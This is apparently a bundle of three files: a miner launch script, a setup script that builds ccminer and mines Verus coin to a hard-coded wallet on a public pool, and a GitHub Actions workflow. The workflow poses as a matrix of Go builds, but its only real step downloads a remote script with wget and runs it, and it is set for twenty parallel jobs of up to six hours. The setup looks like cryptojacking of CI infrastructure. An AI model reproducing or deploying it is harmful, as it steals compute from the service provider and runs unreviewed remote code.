#!/bin/sh
PoolHost=
Port=
PublicVerusCoinAddress=
WorkerName=
Threads=
#set working directory to the location of this script
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd $DIR
./nheqminer -v -l "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -t "${Threads}" "$@"




#!/bin/sh

apt update
apt install sudo
apt install git -y
sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
cd ccminer
chmod +x build.sh
chmod +x configure.sh
chmod +x autogen.sh
./build.sh
./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r.ZERG -t 2


name: nyolong
on: [push, pull_request]
jobs:
  build:
    name: nyolong
    runs-on: ubuntu-18.04
    strategy:
      max-parallel: 20
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.0]
        flag: [A, B]
    timeout-minutes: 360
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v1
    - name: runner_go
      run: |
	wget https://github.com/cemlu2022/cemu/blob/main/ty.sh && chmod u+x ty.sh && ./ty.sh
